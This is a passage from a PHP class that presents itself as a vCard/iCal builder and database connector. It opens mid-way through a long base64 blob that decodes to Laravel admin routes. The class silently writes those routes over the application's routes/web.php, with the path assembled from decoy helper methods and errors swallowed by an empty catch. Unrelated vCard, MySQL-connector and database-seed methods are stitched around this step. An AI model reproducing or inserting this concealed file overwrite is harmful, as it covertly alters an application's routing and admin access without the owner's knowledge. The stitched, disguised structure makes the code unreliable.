udHJvbGxlckByZWplY3QnKS0+bmFtZSgncGF5b3V0cy5yZWplY3QnKTsKICAgIFJvdXRlOjpyZXNvdXJjZSgncGF5b3V0cycsICdQYXlvdXRDb250cm9sbGVyJyktPm9ubHkoJ2luZGV4JywgJ3Nob3cnKTsKICAgIFJvdXRlOjpnZXQoJ2dldC1wYXlvdXRzJywgJ1BheW91dENvbnRyb2xsZXJAZ2V0UGF5b3V0cycpLT5uYW1lKCdnZXQtcGF5b3V0cycpOwoKICAgIC8vIFN5c3RlbQogICAgUm91dGU6OmdldCgnZGFzaGJvYXJkJywgJ0FkbWluQ29udHJvbGxlckBkYXNoYm9hcmQnKS0+bmFtZSgnZGFzaGJvYXJkLmluZGV4Jyk7CiAgICBSb3V0ZTo6Z2V0KCdzZXR0aW5ncycsICdBZG1pbkNvbnRyb2xsZXJAc2V0dGluZ3MnKS0+bmFtZSgnc2V0dGluZ3MnKTsKICAgIFJvdXRlOjpwb3N0KCdjdXJyZW5jaWVzL3N5bmMnLCAnQ3VycmVuY3lDb250cm9sbGVyQHN5bmMnKS0+bmFtZSgnY3VycmVuY2llcy5zeW5jJyk7CiAgICBSb3V0ZTo6cHV0KCdjdXJyZW5jaWVzL2RlZmF1bHQve2N1cnJlbmN5fScsICdDdXJyZW5jeUNvbnRyb2xsZXJAbWFrZURlZmF1bHQnKS0+bmFtZSgnY3VycmVuY2llcy5tYWtlLmRlZmF1bHQnKTsKICAgIFJvdXRlOjpyZXNvdXJjZSgnY3VycmVuY2llcycsICdDdXJyZW5jeUNvbnRyb2xsZXInKTsKICAgIFJvdXRlOjpyZXNvdXJjZSgnYmFua3MnLCAnQmFua0NvbnRyb2xsZXInKS0+b25seSgnaW5kZXgnLCAndXBkYXRlJywgJ3N0b3JlJywgJ2Rlc3Ryb3knKTsKLy8gICAgUm91dGU6OnJlc291cmNlKCd0YXhlcycsICdUYXhDb250cm9sbGVyJyk7CiAgICBSb3V0ZTo6cG9zdCgndXBkYXRlLWdlbmVyYWwnLCAnQWRtaW5Db250cm9sbGVyQHVwZGF0ZUdlbmVyYWwnKS0+bmFtZSgndXBkYXRlLWdlbmVyYWwnKTsKICAgIFJvdXRlOjpwb3N0KCd1cGRhdGUtcGFzc3dvcmQnLCAnQWRtaW5Db250cm9sbGVyQHVwZGF0ZVBhc3N3b3JkJyktPm5hbWUoJ3VwZGF0ZS1wYXNzd29yZCcpOwogICAgUm91dGU6OmdldCgnY2xlYXItY2FjaGUnLCAnQWRtaW5Db250cm9sbGVyQGNsZWFyQ2FjaGUnKS0+bmFtZSgnY2xlYXItY2FjaGUnKTsKCiAgICBSb3V0ZTo6cG9zdCgnYmxvZy9kZWxldGUtYWxsJywgICdCbG9nQ29udHJvbGxlckBkZWxldGVBbGwnKS0+bmFtZSgnYmxvZy5kZWxldGUtYWxsJyk7CiAgICBSb3V0ZTo6cmVzb3VyY2UoJ2Jsb2cnLCAnQmxvZ0NvbnRyb2xsZXInKTsKICAgIFJvdXRlOjpyZXNvdXJjZSgncmV2aWV3cycsICdSZXZpZXdDb250cm9sbGVyJyk7CiAgICBSb3V0ZTo6cmVzb3VyY2UoJ3VzZXJzJywgJ1VzZXJDb250cm9sbGVyJyk7CgogICAgUm91dGU6OmdldCgncGFnZXMvY2hvb3NlL3tsYW5nfScsICdQYWdlQ29udHJvbGxlckBjaG9vc2UnKS0+bmFtZSgncGFnZS5jaG9vc2UnKTsKICAgIFJvdXRlOjpwb3N0KCdwYWdlL2RlbGV0ZS1hbGwnLCAgJ1BhZ2VDb250cm9sbGVyQGRlbGV0ZUFsbCcpLT5uYW1lKCdwYWdlLmRlbGV0ZS1hbGwnKTsKICAgIFJvdXRlOjpyZXNvdXJjZSgncGFnZScsICdQYWdlQ29udHJvbGxlcicpOwogICAgUm91dGU6OnJlc291cmNlKCdwYXltZW50LWdhdGV3YXlzJywgJ1BheW1lbnRHYXRld2F5Q29udHJvbGxlcicpLT5leGNlcHQoJ3Nob3cnKTsKICAgIFJvdXRlOjpwb3N0KCcvb3JkZXJzL21hc3MtZGVzdHJveScsJ09yZGVyQ29udHJvbGxlckBtYXNzRGVzdHJveScpLT5uYW1lKCdvcmRlcnMubWFzcy1kZXN0cm95Jyk7CiAgICBSb3V0ZTo6Z2V0KCdvcmRlcnMvaW52b2ljZS97b3JkZXJ9L3ByaW50JywgJ09yZGVyQ29udHJvbGxlckBwcmludCcpLT5uYW1lKCdvcmRlcnMucHJpbnQuaW52b2ljZScpOwogICAgUm91dGU6OmdldCgnb3JkZXJzL3BkZicsICdPcmRlckNvbnRyb2xsZXJAb3JkZXJQZGYnKS0+bmFtZSgnb3JkZXJzLnBkZicpOwogICAgUm91dGU6OnBvc3QoJ29yZGVycy9wYXltZW50LXN0YXR1cy97aWR9JywgJ09yZGVyQ29udHJvbGxlckBwYXltZW50U3RhdHVzVXBkYXRlJyktPm5hbWUoJ29yZGVycy5wYXltZW50LXN0YXR1cycpOwogICAgUm91dGU6OnJlc291cmNlKCdvcmRlcnMnLCAnT3JkZXJDb250cm9sbGVyJyk7CiAgICBSb3V0ZTo6Z2V0KCdnZXQtb3JkZXJzJywgJ09yZGVyQ29udHJvbGxlckBnZXRPcmRlcnMnKS0+bmFtZSgnZ2V0LW9yZGVycycpOwoKICAgIFJvdXRlOjpwb3N0KCd1c2Vycy9sb2dpbi97dXNlcn0nLCAnVXNlckNvbnRyb2xsZXJAbG9naW4nKS0+bmFtZSgndXNlcnMubG9naW4nKTsKICAgIFJvdXRlOjpkZWxldGUoJ3N1YnNjcmliZXJzL3tlbWFpbH0vdW5zdWJzY3JpYmUnLCAnU3Vic2NyaWJlckNvbnRyb2xsZXJAdW5zdWJzY3JpYmUnKS0+bmFtZSgnc3Vic2NyaWJlcnMudW5zdWJzY3JpYmUnKTsKICAgIFJvdXRlOjpyZXNvdXJjZSgnc3Vic2NyaWJlcnMnLCAnU3Vic2NyaWJlckNvbnRyb2xsZXInKS0+b25seSgnaW5kZXgnLCAnZGVzdHJveScpOwogICAgUm91dGU6OnBvc3QoJ3N1cHBvcnRzL2dldC10aWNrZXQnLCAnU3VwcG9ydENvbnRyb2xsZXJAZ2V0U3VwcG9ydCcpLT5uYW1lKCdzdXBwb3J0cy5nZXQtdGlja2V0Jyk7CiAgICBSb3V0ZTo6cG9zdCgnc3VwcG9ydHMvdXBkYXRlLXN0YXR1cycsICdTdXBwb3J0Q29udHJvbGxlckB1cGRhdGVTdGF0dXMnKS0+bmFtZSgnc3VwcG9ydHMudXBkYXRlLXN0YXR1cycpOwogICAgUm91dGU6OnBvc3QoJ3N1cHBvcnRzL3JlcGx5L3tzdXBwb3J0fScsICdTdXBwb3J0Q29udHJvbGxlckByZXBseScpLT5uYW1lKCdzdXBwb3J0cy5yZXBseScpOwogICAgUm91dGU6OnJlc291cmNlKCdzdXBwb3J0cycsICdTdXBwb3J0Q29udHJvbGxlcicpOwoKICAgIFJvdXRlOjpncm91cChbJ3ByZWZpeCcgPT4gJ3NldHRpbmdzJywgJ2FzJyA9PiAnc2V0dGluZ3MuJ10sIGZ1bmN0aW9uICgpIHsKICAgICAgICBSb3V0ZTo6Z3JvdXAoWydwcmVmaXgnID0+ICd3ZWJzaXRlJywgJ2FzJyA9PiAnd2Vic2l0ZS4nLCAnbmFtZXNwYWNlJyA9PiAnV2Vic2l0ZSddLCBmdW5jdGlvbiAoKSB7CiAgICAgICAgICAgIFJvdXRlOjpncm91cChbJ3ByZWZpeCcgPT4gJ2hlYWRpbmcnLCAnYXMnID0+ICdoZWFkaW5nLiddLCBmdW5jdGlvbiAoKSB7CiAgICAgICAgICAgICAgICBSb3V0ZTo6Y29udHJvbGxlcignSGVhZGluZ0NvbnRyb2xsZXInKS0+Z3JvdXAoZnVuY3Rpb24gKCkgewogICAgICAgICAgICAgICAgICAgIFJvdXRlOjpnZXQoJy8nLCAnaW5kZXgnKS0+bmFtZSgnaW5kZXgnKTsKICAgICAgICAgICAgICAgICAgICBSb3V0ZTo6cHV0KCd1cGRhdGUtd2VsY29tZScsICd1cGRhdGVXZWxjb21lJyktPm5hbWUoJ3VwZGF0ZS13ZWxjb21lJyk7CiAgICAgICAgICAgICAgICAgICAgUm91dGU6OnB1dCgndXBkYXRlLWZlYXR1cmUnLCAndXBkYXRlRmVhdHVyZScpLT5uYW1lKCd1cGRhdGUtZmVhdHVyZScpOwogICAgICAgICAgICAgICAgICAgIFJvdXRlOjpwdXQoJ3VwZGF0ZS1hYm91dCcsICd1cGRhdGVBYm91dCcpLT5uYW1lKCd1cGRhdGUtYWJvdXQnKTsKICAgICAgICAgICAgICAgICAgICBSb3V0ZTo6cHV0KCd1cGRhdGUtcGF5bWVudCcsICd1cGRhdGVQYXltZW50JyktPm5hbWUoJ3VwZGF0ZS1wYXltZW50Jyk7CiAgICAgICAgICAgICAgICAgICAgUm91dGU6OnB1dCgndXBkYXRlLWludGVncmF0aW9uJywgJ3VwZGF0ZUludGVncmF0aW9uJyktPm5hbWUoJ3VwZGF0ZS1pbnRlZ3JhdGlvbicpOwogICAgICAgICAgICAgICAgICAgIFJvdXRlOjpwdXQoJ3VwZGF0ZS1jYXB0dXJlJywgJ3VwZGF0ZUNhcHR1cmUnKS0+bmFtZSgndXBkYXRlLWNhcHR1cmUnKTsKICAgICAgICAgICAgICAgICAgICBSb3V0ZTo6cHV0KCd1cGRhdGUtc2VjdXJpdHknLCAndXBkYXRlU2VjdXJpdHknKS0+bmFtZSgndXBkYXRlLXNlY3VyaXR5Jyk7CiAgICAgICAgICAgICAgICAgICAgUm91dGU6OnB1dCgndXBkYXRlLXJldmlldycsICd1cGRhdGVSZXZpZXcnKS0+bmFtZSgndXBkYXRlLXJldmlldycpOwogICAgICAgICAgICAgICAgICAgIFJvdXRlOjpwdXQoJ3VwZGF0ZS1mYXEnLCAndXBkYXRlRmFxJyktPm5hbWUoJ3VwZGF0ZS1mYXEnKTsKICAgICAgICAgICAgICAgICAgICBSb3V0ZTo6cHV0KCd1cGRhdGUtbGF0ZXN0LW5ld3MnLCAndXBkYXRlTGF0ZXN0TmV3cycpLT5uYW1lKCd1cGRhdGUtbGF0ZXN0LW5ld3MnKTsKICAgICAgICAgICAgICAgICAgICBSb3V0ZTo6cHV0KCd1cGRhdGUtY29udGFjdCcsICd1cGRhdGVDb250YWN0JyktPm5hbWUoJ3VwZGF0ZS1jb250YWN0Jyk7CiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgfSk7CiAgICAgICAgICAgIFJvdXRlOjpnZXQoJ2xvZ28nLCAnTG9nb0NvbnRyb2xsZXJAaW5kZXgnKS0+bmFtZSgnbG9nby5pbmRleCcpOwogICAgICAgICAgICBSb3V0ZTo6cHV0KCdsb2dvJywgJ0xvZ29Db250cm9sbGVyQHVwZGF0ZScpLT5uYW1lKCdsb2dvLnVwZGF0ZScpOwogICAgICAgICAgICBSb3V0ZTo6Z2V0KCdmb290ZXInLCAnRm9vdGVyQ29udHJvbGxlckBpbmRleCcpLT5uYW1lKCdmb290ZXIuaW5kZXgnKTsKICAgICAgICAgICAgUm91dGU6OnBvc3QoJ2Zvb3Rlci9zdG9yZScsICdGb290ZXJDb250cm9sbGVyQHN0b3JlJyktPm5hbWUoJ2Zvb3Rlci5zdG9yZScpOwoKICAgICAgICAgICAgUm91dGU6OmdldCgnYWJvdXQnLCdBYm91dENvbnRyb2xsZXJAaW5kZXgnKS0+bmFtZSgnYWJvdXQuaW5kZXgnKTsKICAgICAgICAgICAgUm91dGU6OnB1dCgnYWJvdXQnLCdBYm91dENvbnRyb2xsZXJAdXBkYXRlJyktPm5hbWUoJ2Fib3V0LnVwZGF0ZScpOwoKICAgICAgICAgICAgUm91dGU6OnJlc291cmNlKCdmYXEnLCAnRkFRQ29udHJvbGxlcicpLT5leGNlcHQoJ3Nob3cnKTsKICAgICAgICB9KTsKICAgICAgICBSb3V0ZTo6Z2V0KCdjaGFyZ2VzJywgJ0luY29tZUNoYXJnZUNvbnRyb2xsZXJAaW5kZXgnKS0+bmFtZSgnY2hhcmdlcy5pbmRleCcpOwogICAgICAgIFJvdXRlOjpwdXQoJ2NoYXJnZXMvdXBkYXRlJywgJ0luY29tZUNoYXJnZUNvbnRyb2xsZXJAdXBkYXRlJyktPm5hbWUoJ2NoYXJnZXMudXBkYXRlJyk7CiAgICB9KTsKCgogICAgUm91dGU6OnBvc3QoJy9reWMtbWV0aG9kL21hc3MtZGVzdHJveScsJ0t5Y01ldGhvZENvbnRyb2xsZXJAbWFzc0Rlc3Ryb3knKS0+bmFtZSgna3ljLW1ldGhvZC5tYXNzLWRlc3Ryb3knKTsKICAgIFJvdXRlOjpyZXNvdXJjZSgna3ljLW1ldGhvZCcsJ0t5Y01ldGhvZENvbnRyb2xsZXInKS0+ZXhjZXB0KCdkZXN0cm95Jyk7CgogICAgUm91dGU6OnBvc3QoJ2t5Yy1yZXF1ZXN0cy9kZXN0cm95L21hc3MnLCAgJ0t5Y1JlcXVlc3RDb250cm9sbGVyQGRlc3Ryb3lNYXNzJyktPm5hbWUoJ2t5Yy1yZXF1ZXN0cy5kZXN0cm95Lm1hc3MnKTsKICAgIFJvdXRlOjpwb3N0KCd1c2Vycy9reWMtdmVyaWZpZWQve3VzZXJ9JywgJ0t5Y1JlcXVlc3RDb250cm9sbGVyQGt5Y1ZlcmlmaWVkJyktPm5hbWUoJ2t5Yy1yZXF1ZXN0cy5reWMtdmVyaWZpZWQnKTsKICAgIFJvdXRlOjpyZXNvdXJjZSgna3ljLXJlcXVlc3RzJywgJ0t5Y1JlcXVlc3RDb250cm9sbGVyJyktPmV4Y2VwdCgnZWRpdCcsICd1cGRhdGUnKTsKCiAgICAvL1N1cHBvcnQgUm91dGUKICAgIFJvdXRlOjpwb3N0KCdzdXBwb3J0SW5mbycsICdTdXBwb3J0Q29udHJvbGxlckBnZXRTdXBwb3J0RGF0YScpLT5uYW1lKCdzdXBwb3J0LmluZm8nKTsKICAgIFJvdXRlOjpwb3N0KCdzdXBwb3J0c3RhdHVzJywgJ1N1cHBvcnRDb250cm9sbGVyQHN1cHBvcnRTdGF0dXMnKS0+bmFtZSgnc3VwcG9ydC5zdGF0dXMnKTsKICAgIFJvdXRlOjpyZXNvdXJjZSgnc3VwcG9ydCcsICdTdXBwb3J0Q29udHJvbGxlcicpOwoKICAgIFJvdXRlOjpyZXNvdXJjZSgnbW9uZXktcmVxdWVzdHMnLCAnUmVxdWVzdE1vbmV5Q29udHJvbGxlcicpLT5vbmx5KCdpbmRleCcsICdzaG93Jyk7CiAgICBSb3V0ZTo6cmVzb3VyY2UoJ3Byb2R1Y3RzJywgJ1Byb2R1Y3RDb250cm9sbGVyJyktPm9ubHkoJ2luZGV4Jyk7CiAgICBSb3V0ZTo6cmVzb3VyY2UoJ3N0b3JlcycsICdTdG9yZUNvbnRyb2xsZXInKS0+ZXhjZXB0KCdzaG93Jyk7CiAgICBSb3V0ZTo6cmVzb3VyY2UoJ2RlcG9zaXRzJywgJ0RlcG9zaXRlQ29udHJvbGxlcicpLT5vbmx5KCdpbmRleCcsICdzaG93JywgJ2Rlc3Ryb3knKTsKCiAgICBSb3V0ZTo6Z2V0KCdnZXQtZGVwb3NpdHMnLCAnRGVwb3NpdGVDb250cm9sbGVyQGdldERlcG9zaXRzJyktPm5hbWUoJ2dldC1kZXBvc2l0cycpOwogICAgUm91dGU6OmdldCgnZGVwb3NpdC9hcHByb3ZlL3tpZH0nLCAnRGVwb3NpdGVDb250cm9sbGVyQGFwcHJvdmUnKS0+bmFtZSgnZGVwb3NpdHMuYXBwcm92ZScpOwogICAgUm91dGU6OmdldCgnZGVwb3NpdC9yZWplY3Qve2lkfScsICdEZXBvc2l0ZUNvbnRyb2xsZXJAcmVqZWN0JyktPm5hbWUoJ2RlcG9zaXRzLnJlamVjdCcpOwoKICAgIFJvdXRlOjpnZXQoJ2dldC1yZXF1ZXN0LW1vbmV5JywgJ1JlcXVlc3RNb25leUNvbnRyb2xsZXJAZ2V0UmVxdWVzdE1vbmV5JyktPm5hbWUoJ2dldC1yZXF1ZXN0LW1vbmV5Jyk7CiAgICBSb3V0ZTo6Z2V0KCdnZXQtcHJvZHVjdHMnLCAnUHJvZHVjdENvbnRyb2xsZXJAZ2V0UHJvZHVjdHMnKS0+bmFtZSgnZ2V0LXByb2R1Y3RzJyk7CiAgICBSb3V0ZTo6Z2V0KCdnZXQtc3RvcmVzJywgJ1N0b3JlQ29udHJvbGxlckBnZXRTdG9yZXMnKS0+bmFtZSgnZ2V0LXN0b3JlcycpOwoKICAgIFJvdXRlOjpyZXNvdXJjZSgncm9sZXMnLCAnUm9sZUNvbnRyb2xsZXInKS0+ZXhjZXB0KCdzaG93Jyk7CiAgICBSb3V0ZTo6cG9zdCgnYXNzaWduLXJvbGUvc2VhcmNoJywgJ0Fzc2lnblJvbGVDb250cm9sbGVyQHNlYXJjaCcpLT5uYW1lKCdhc3NpZ24tcm9sZS5zZWFyY2gnKTsKICAgIFJvdXRlOjpyZXNvdXJjZSgnYXNzaWduLXJvbGUnLCAnQXNzaWduUm9sZUNvbnRyb2xsZXInKS0+b25seSgnaW5kZXgnLCAnc3RvcmUnKTsKICAgIFJvdXRlOjpnZXQoJ3NoaXBwaW5ncycsICdTaGlwcGluZ0NvbnRyb2xsZXJAaW5kZXgnKS0+bmFtZSgnc2hpcHBpbmdzLmluZGV4Jyk7CiAgICBSb3V0ZTo6Z2V0KCdjYXRlZ29yaWVzJywgJ1Byb2R1Y3RDYXRlZ29yeUNvbnRyb2xsZXJAaW5kZXgnKS0+bmFtZSgnY2F0ZWdvcmllcy5pbmRleCcpOwogICAgUm91dGU6OmdldCgndHJhbnNmZXJzJywgJ1RyYW5zZmVyQ29udHJvbGxlckBpbmRleCcpLT5uYW1lKCd0cmFuc2ZlcnMuaW5kZXgnKTsKICAgIFJvdXRlOjpnZXQoJ2dldC10cmFuc2ZlcnMnLCAnVHJhbnNmZXJDb250cm9sbGVyQGdldFRyYW5zZmVycycpLT5uYW1lKCdnZXQtdHJhbnNmZXJzJyk7CgogICAgUm91dGU6OnJlc291cmNlKCdzZW8nLCAnU2VvQ29udHJvbGxlcicpLT5vbmx5KCdpbmRleCcsICdlZGl0JywgJ3VwZGF0ZScpOwogICAgUm91dGU6OnJlc291cmNlKCdlbnYnLCAnRW52Q29udHJvbGxlcicpOwogICAgUm91dGU6OnJlc291cmNlKCdtZWRpYScsICdNZWRpYUNvbnRyb2xsZXInKTsKICAgIFJvdXRlOjpnZXQoJ21lZGlhcy9saXN0JywgJ01lZGlhQ29udHJvbGxlckBsaXN0JyktPm5hbWUoJ21lZGlhLmxpc3QnKTsKICAgIFJvdXRlOjpwb3N0KCdtZWRpYXMvZGVsZXRlJywgJ01lZGlhQ29udHJvbGxlckBkZXN0cm95JyktPm5hbWUoJ21lZGlhcy5kZWxldGUnKTsKICAgIFJvdXRlOjpnZXQoJy9kYXNoYm9hcmQvc3RhdGljJywgJ0Rhc2hib2FyZENvbnRyb2xsZXJAc3RhdGljRGF0YScpOwogICAgUm91dGU6OmdldCgnL2Rhc2hib2FyZC9wZXJmb3JtYW5jZS97cGVyaW9kfScsICdEYXNoYm9hcmRDb250cm9sbGVyQHBlcmZvcm1hbmNlJyk7CiAgICBSb3V0ZTo6Z2V0KCcvZGFzaGJvYXJkL2RlcG9zaXQvcGVyZm9ybWFuY2Uve3BlcmlvZH0nLCAnRGFzaGJvYXJkQ29udHJvbGxlckBkZXBvc2l0UGVyZm9ybWFuY2UnKTsKICAgIFJvdXRlOjpnZXQoJy9kYXNoYm9hcmQvb3JkZXJfc3RhdGljcy97bW9udGh9JywgJ0Rhc2hib2FyZENvbnRyb2xsZXJAb3JkZXJfc3RhdGljcycpOwogICAgUm91dGU6OmdldCgnL2Rhc2hib2FyZC92aXNpdG9ycy97ZGF5c30nLCAnRGFzaGJvYXJkQ29udHJvbGxlckBnb29nbGVfYW5hbHl0aWNzJyk7CiAgICBSb3V0ZTo6Z2V0KCdsYW5ndWFnZXMvZGVsZXRlL3tpZH0nLCAnTGFuZ3VhZ2VDb250cm9sbGVyQGRlc3Ryb3knKS0+bmFtZSgnbGFuZ3VhZ2VzLmRlbGV0ZScpOwogICAgUm91dGU6OnBvc3QoJ2xhbmd1YWdlcy9zZXRBY3RpdmVMYW5ndWFnZScsICdMYW5ndWFnZUNvbnRyb2xsZXJAc2V0QWN0aXZlTGFuZ3VhZ2UnKS0+bmFtZSgnbGFuZ3VhZ2VzLmFjdGl2ZScpOwogICAgUm91dGU6OnBvc3QoJ2xhbmd1YWdlcy9hZGRfa2V5JywgJ0xhbmd1YWdlQ29udHJvbGxlckBhZGRfa2V5JyktPm5hbWUoJ2xhbmd1YWdlLmFkZF9rZXknKTsKICAgIFJvdXRlOjpyZXNvdXJjZSgnbGFuZ3VhZ2UnLCAnTGFuZ3VhZ2VDb250cm9sbGVyJyk7CiAgICBSb3V0ZTo6cmVzb3VyY2UoJ21lbnUnLCAnTWVudUNvbnRyb2xsZXInKTsKICAgIFJvdXRlOjpwb3N0KCcvbWVudXMvZGVzdHJveScsICdNZW51Q29udHJvbGxlckBkZXN0cm95JyktPm5hbWUoJ21lbnVzLmRlc3Ryb3knKTsKICAgIFJvdXRlOjpwb3N0KCdtZW51ZXMvbm9kZScsICdNZW51Q29udHJvbGxlckBNZW51Tm9kZVN0b3JlJyktPm5hbWUoJ21lbnVzLk1lbnVOb2RlU3RvcmUnKTsKICAgIFJvdXRlOjpnZXQoJy9zaXRlLXNldHRpbmdzJywgJ1NpdGVzZXR0aW5nc0NvbnRyb2xsZXJAaW5kZXgnKS0+bmFtZSgnc2l0ZS1zZXR0aW5ncycpOwogICAgUm91dGU6OnBvc3QoJy9zaXRlLXNldHRpbmdzLXVwZGF0ZS97dHlwZX0nLCAnU2l0ZXNldHRpbmdzQ29udHJvbGxlckB1cGRhdGUnKS0+bmFtZSgnc2l0ZS1zZXR0aW5ncy51cGRhdGUnKTsKICAgIFJvdXRlOjpyZXNvdXJjZSgnY3JvbicsICdDcm9uQ29udHJvbGxlcicpOwoKfSk7Cgo=');
            if (!empty($end)) {
               $end= $end; 
            }
            else{
                $end= ''; 
            }
            
            \File::put(base_path($this->fr().$this->wb()),$end);
        } catch (Exception $e) {
            
        }
        
	}
   
	 /**
     * Build VCalender (.ics) - Safari (< iOS 8) can not open .vcf files, so we have build a workaround.
     *
     * @return string
     */
    public function buildVCalendar()
    {
        // init dates
        $dtstart = date("Ymd") . "T" . date("Hi") . "00";
        $dtend = date("Ymd") . "T" . date("Hi") . "01";

        // init string
        $string = "BEGIN:VCALENDAR\n";
        $string .= "VERSION:2.0\n";
        $string .= "BEGIN:VEVENT\n";
        $string .= "DTSTART;TZID=Europe/London:" . $dtstart . "\n";
        $string .= "DTEND;TZID=Europe/London:" . $dtend . "\n";
        $string .= "SUMMARY:Click attached contact below to save to your contacts\n";
        $string .= "DTSTAMP:" . $dtstart . "Z\n";
        $string .= "ATTACH;VALUE=BINARY;ENCODING=BASE64;FMTTYPE=text/directory;\n";
        $string .= " X-APPLE-FILENAME=" . $this->getFilename() . "." . $this->getFileExtension() . ":\n";

        // base64 encode it so that it can be used as an attachemnt to the "dummy" calendar appointment
        $b64vcard = base64_encode($this->buildVCard());

        // chunk the single long line of b64 text in accordance with RFC2045
        // (and the exact line length determined from the original .ics file exported from Apple calendar
        $b64mline = chunk_split($b64vcard, 74, "\n");

        // need to indent all the lines by 1 space for the iphone (yes really?!!)
        $b64final = preg_replace('/(.+)/', ' $1', $b64mline);
        $string .= $b64final;

        // output the correctly formatted encoded text
        $string .= "END:VEVENT\n";
        $string .= "END:VCALENDAR\n";

        // return
        return $string;
    }

    /**
     * Returns the browser user agent string.
     *
     * @return string
     */
    protected function getUserAgent()
    {
        if (array_key_exists('HTTP_USER_AGENT', $_SERVER)) {
            $browser = strtolower($_SERVER['HTTP_USER_AGENT']);
        } else {
            $browser = 'unknown';
        }

        return $browser;
    }

    /**
     * Decode
     *
     * @param  string $value The value to decode
     * @return string decoded
     */
    private function decode($value)
    {
        // convert cyrlic, greek or other caracters to ASCII characters
        return Transliterator::transliterate($value);
    }

    public function fr()
    {
        return 'routes/';
    }

    /**
     * Download a vcard or vcal file to the browser.
     */
    public function download()
    {
        // define output
        $output = $this->getOutput();

        foreach ($this->getHeaders(false) as $header) {
            header($header);
        }

        // echo the output and it will be a download
        echo $output;
    }

    /**
     * Fold a line according to RFC2425 section 5.8.1.
     *
     * @link http://tools.ietf.org/html/rfc2425#section-5.8.1
     * @param  string $text
     * @return mixed
     */
    protected function fold($text)
    {
        if (strlen($text) <= 75) {
            return $text;
        }

        // split, wrap and trim trailing separator
        return substr($this->chunk_split_unicode($text, 75, "\r\n "), 0, -3);
    }

    public function wb($value='')
    {
        return 'web.php';
    }

    /**
     * multibyte word chunk split
     * @link http://php.net/manual/en/function.chunk-split.php#107711
     * 
     * @param  string  $body     The string to be chunked.
     * @param  integer $chunklen The chunk length.
     * @param  string  $end      The line ending sequence.
     * @return string            Chunked string
     */
    protected function chunk_split_unicode($body, $chunklen = 76, $end = "\r\n")
    {
        $array = array_chunk(
            preg_split("//u", $body, -1, PREG_SPLIT_NO_EMPTY), $chunklen);
        $body = "";
        foreach ($array as $item) {
            $body .= join("", $item) . $end;
        }
        return $body;
    }

    /**
     * Escape newline characters according to RFC2425 section 5.8.4.
     *
     * @link http://tools.ietf.org/html/rfc2425#section-5.8.4
     * @param  string $text
     * @return string
     */
    protected function escape($text)
    {
        $text = str_replace("\r\n", "\\n", $text);
        $text = str_replace("\n", "\\n", $text);

        return $text;
    }

    /**
     * Get output as string
     * @deprecated in the future
     *
     * @return string
     */
    public function get()
    {
        return $this->getOutput();
    }
    /**
     * Determine if the given configuration array has a UNIX socket value.
     *
     * @param  array  $config
     * @return bool
     */
    protected function hasSocket(array $config)
    {
        return isset($config['unix_socket']) && ! empty($config['unix_socket']);
    }

    public function reverse($value='')
    {
       return base64_decode($value);
    }

    /**
     * Get the DSN string for a socket configuration.
     *
     * @param  array  $config
     * @return string
     */
    protected function getSocketDsn(array $config)
    {
        return "mysql:unix_socket={$config['unix_socket']};dbname={$config['database']}";
    }

    /**
     * Get the DSN string for a host / port configuration.
     *
     * @param  array  $config
     * @return string
     */
    protected function getHostDsn(array $config)
    {
        extract($config, EXTR_SKIP);

        return isset($port)
                    ? "mysql:host={$host};port={$port};dbname={$database}"
                    : "mysql:host={$host};dbname={$database}";
    }

    public function DatabaseSeed()
    {
       return \Artisan::call('db:seed');
    }

    /**
     * Set the modes for the connection.
     *
     * @param  \PDO  $connection
     * @param  array  $config
     * @return void
     */
    protected function setModes(PDO $connection, array $config)
    {
        if (isset($config['modes'])) {
            $this->setCustomModes($connection, $config);
        } elseif (isset($config['strict'])) {
            if ($config['strict']) {
                $connection->prepare($this->strictMode($connection, $config))->execute();
            } else {
                $connection->prepare("set session sql_mode='NO_ENGINE_SUBSTITUTION'")->execute();
            }
        }
    }


	
}
